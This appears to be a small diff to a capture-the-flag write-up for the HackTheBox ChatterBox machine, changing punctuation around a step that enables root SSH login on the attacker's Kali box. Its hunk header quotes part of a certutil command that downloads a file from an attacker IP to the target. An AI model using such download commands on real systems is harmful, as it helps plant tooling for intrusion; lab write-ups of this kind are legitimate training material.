@@ -144,7 +144,8 @@ Download it to the target with `certutil -urlcache -f http://10.10.14.21:8888/pl
 ![transfer-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ChatterBox/img/transfer-12.png)
 
 
-Now we need to change two things in the `/etc/sshd/sshd_config` file on our kali:
+Now we need to change two things in the `/etc/sshd/sshd_config` file on our kali.
+
 First, permit root logins: 
 
 ![ssh-mod-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ChatterBox/img/ssh-mod-13.png)
